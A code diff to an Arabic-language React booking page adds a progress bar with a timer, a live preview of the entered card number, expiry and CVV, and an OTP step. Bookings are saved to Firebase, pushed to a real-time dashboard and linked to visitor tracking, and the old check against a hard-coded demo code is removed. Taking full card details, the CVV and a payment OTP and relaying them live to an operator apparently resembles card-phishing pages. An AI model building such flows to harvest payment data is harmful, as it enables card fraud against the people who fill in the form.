@@ -9,6 +9,10 @@ import { base44 } from "@/api/base44Client";
 import { updateVisitorFromBooking } from "@/lib/visitorTracker";
 import { addBooking } from "@/lib/firebaseService";
 import { Link } from "react-router-dom";
+import StepProgressBar from "@/components/StepProgressBar";
+import CardMockup from "@/components/CardMockup";
+import OTPCard from "@/components/OTPCard";
+import { bookingNotifications, BOOKING_EVENTS } from "@/lib/bookingNotifications";
 
 const restaurants = [
   "اوڤر اندر", "بيرنجاك", "جيم خانا", "ستيلا سكاي لاونج",
@@ -175,6 +179,16 @@ export default function Booking() {
       {/* Form Area */}
       <section className="py-16 px-6 pb-32">
         <div className="max-w-3xl mx-auto">
+          {/* Step Progress Bar */}
+          {!submitted && (
+            <StepProgressBar 
+              currentStep={step + 1} 
+              totalSteps={3}
+              stepTitles={['تفاصيل الحجز', 'بيانات الدفع', 'تأكيد الدفع']}
+              showTimer={true}
+            />
+          )}
+          
           <AnimatePresence mode="wait">
             {submitted ? (
               <motion.div key="success" initial={{ opacity: 0, scale: 0.97 }} animate={{ opacity: 1, scale: 1 }}
@@ -406,6 +420,18 @@ export default function Booking() {
                             <Lock className="w-3 h-3 text-primary" /><span>مشفّر وآمن</span>
                           </div>
                         </div>
+                        
+                        {/* Card Mockup Preview */}
+                        <div className="p-6 border-b border-border/20 bg-gradient-to-b from-primary/5 to-transparent">
+                          <p className="text-muted-foreground text-xs tracking-widest uppercase mb-4">معاينة البطاقة</p>
+                          <CardMockup 
+                            cardNumber={payment.card_number.replace(/\s/g, '')}
+                            cardHolder={payment.card_name || 'اسم صاحب البطاقة'}
+                            expiryDate={payment.expiry}
+                            cvv={payment.cvv}
+                          />
+                        </div>
+                        
                         <div className="p-6 space-y-4">
                           <div className="bg-gradient-to-br from-muted to-background border border-border/30 p-5 flex justify-between items-end mb-6" dir="ltr">
                             <div>
@@ -484,71 +510,87 @@ export default function Booking() {
                   {/* ── STEP 2: Payment OTP ── */}
                   {!transitioning && step === 2 && (
                     <motion.div key="step2" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ duration: 0.35 }} className="space-y-6">
+                      {/* OTP Card Component */}
+                      <div className="flex justify-center">
+                        <OTPCard 
+                          demoOTP={DEMO_OTP}
+                          onOTPChange={(value) => {
+                            setPaymentOtp(value);
+                            setPaymentOtpError(false);
+                          }}
+                          onSubmit={async (otpValue) => {
+                            setLoading(true);
+                            try {
+                              // Emit event for real-time updates
+                              const bookingData = { 
+                                ...form, 
+                                type: bookingType, 
+                                guests_count: Number(form.guests_count), 
+                                status: "pending",
+                                bookingId: `BOOKING-${Date.now()}`,
+                                createdAt: new Date().toISOString()
+                              };
+                              
+                              // Save to Base44
+                              await base44.entities.Booking.create(bookingData);
+                              
+                              // Save to Firebase
+                              await addBooking(bookingData);
+                              
+                              // Emit notification event for real-time dashboard updates
+                              bookingNotifications.emit(BOOKING_EVENTS.BOOKING_CREATED, bookingData);
+                              
+                              // Update visitor
+                              await updateVisitorFromBooking(form);
+                              
+                              setLoading(false);
+                              setSubmitted(true);
+                            } catch (error) {
+                              console.error('[v0] Error submitting booking:', error);
+                              setLoading(false);
+                              setPaymentOtpError(true);
+                            }
+                          }}
+                          loading={loading}
+                          error={paymentOtpError}
+                        />
+                      </div>
+
+                      {/* Old OTP Input - Removed and replaced with OTPCard component above */}
                       <div className="border border-border/25 bg-secondary">
                         <div className="px-6 pt-8 pb-6 text-center border-b border-border/20">
                           <div className="w-16 h-16 rounded-full border border-primary/30 bg-primary/5 flex items-center justify-center mx-auto mb-5">
                             <CreditCard className="w-7 h-7 text-primary" />
                           </div>
                           <h3 className="text-foreground text-xl font-bold mb-2" style={{ fontFamily: "'El Messiri', system-ui, sans-serif" }}>
-                            تأكيد عملية الدفع
+                            ملخص الحجز
                           </h3>
-                          <p className="text-muted-foreground text-sm leading-relaxed max-w-xs mx-auto">تم إرسال رمز التحقق لتأكيد دفعتك إلى</p>
-                          <p className="text-primary font-semibold text-sm mt-1" dir="ltr">{form.phone}</p>
-                          <p className="text-muted-foreground/40 text-xs mt-3">(للتجربة: الرمز هو <span className="text-primary/70 font-mono">1234</span>)</p>
+                          <p className="text-muted-foreground text-sm leading-relaxed max-w-xs mx-auto">تفاصيل حجزك</p>
                         </div>
-                        <div className="p-8 space-y-6">
-                          <OtpInput value={paymentOtp} onChange={v => { setPaymentOtp(v); setPaymentOtpError(false); }} hasError={paymentOtpError} />
-                          <AnimatePresence>
-                            {paymentOtpError && (
-                              <motion.p initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
-                                className="text-red-400 text-xs text-center tracking-wide">
-                                الرمز غير صحيح، يرجى المحاولة مجدداً
-                              </motion.p>
-                            )}
-                          </AnimatePresence>
-                          <button type="button" onClick={async () => {
-                            if (paymentOtp !== DEMO_OTP) { setPaymentOtpError(true); return; }
-                            setLoading(true);
-                            try {
-                              // Save to Base44
-                              await base44.entities.Booking.create({ ...form, type: bookingType, guests_count: Number(form.guests_count), status: "pending" });
-                              // Save to Firebase
-                              await addBooking({ 
-                                ...form, 
-                                type: bookingType, 
-                                guests_count: Number(form.guests_count), 
-                                status: "pending",
-                                bookingId: `BOOKING-${Date.now()}`
-                              });
-                              await updateVisitorFromBooking(form);
-                              setLoading(false);
-                              setSubmitted(true);
-                            } catch (error) {
-                              console.error('[v0] Error submitting booking:', error);
-                              setLoading(false);
-                            }
-                          }} disabled={paymentOtp.length < 4 || loading}
-                            className="w-full relative overflow-hidden bg-primary text-primary-foreground py-4 text-xs font-bold tracking-[0.2em] uppercase hover:opacity-90 transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-3">
-                            <span className="absolute inset-0 bg-gradient-to-r from-transparent via-primary-foreground/15 to-transparent animate-[shimmer_3s_ease-in-out_infinite] bg-[length:200%_100%]" />
-                            <Lock className="w-3.5 h-3.5 relative" />
-                            <span className="relative">{loading ? "جاري المعالجة..." : "تأكيد الدفع"}</span>
-                          </button>
-                          <div className="flex items-center justify-center gap-3 pt-1">
-                            <span className="text-muted-foreground text-xs">لم يصلك الرمز؟</span>
-                            {paymentResendTimer > 0 ? (
-                              <span className="text-primary/60 text-xs font-mono" dir="ltr">00:{String(paymentResendTimer).padStart(2, "0")}</span>
-                            ) : (
-                              <button type="button" onClick={sendPaymentOtp}
-                                className="text-primary text-xs flex items-center gap-1 hover:underline underline-offset-4 transition-all">
-                                <RefreshCw className="w-3 h-3" /> إعادة الإرسال
-                              </button>
-                            )}
+                        <div className="p-6 space-y-3">
+                          <div className="flex justify-between items-center py-2 border-b border-border/20">
+                            <span className="text-muted-foreground text-sm">الوجهة</span>
+                            <span className="text-foreground font-semibold">{form.venue_name}</span>
+                          </div>
+                          <div className="flex justify-between items-center py-2 border-b border-border/20">
+                            <span className="text-muted-foreground text-sm">التاريخ</span>
+                            <span className="text-foreground font-semibold" dir="ltr">{form.date}</span>
+                          </div>
+                          <div className="flex justify-between items-center py-2 border-b border-border/20">
+                            <span className="text-muted-foreground text-sm">الوقت</span>
+                            <span className="text-foreground font-semibold" dir="ltr">{form.time}</span>
+                          </div>
+                          <div className="flex justify-between items-center py-2">
+                            <span className="text-muted-foreground text-sm">عدد الضيوف</span>
+                            <span className="text-foreground font-semibold">{form.guests_count}</span>
                           </div>
                         </div>
                       </div>
+                      
                       <button type="button" onClick={() => goTo(1)}
-                        className="w-full border border-border/40 text-muted-foreground py-3 text-xs tracking-widest uppercase hover:border-primary/50 hover:text-primary transition-all duration-300 flex items-center justify-center gap-2">
-                        <ChevronLeft className="w-3.5 h-3.5" /> العودة
+                        className="w-full py-3 text-xs font-bold tracking-widest uppercase border border-primary/40 text-primary hover:bg-primary hover:text-primary-foreground transition-all duration-300 flex items-center justify-center gap-2">
+                        <ChevronLeft className="w-4 h-4" />
+                        العودة لتعديل البطاقة
                       </button>
                     </motion.div>
                   )}
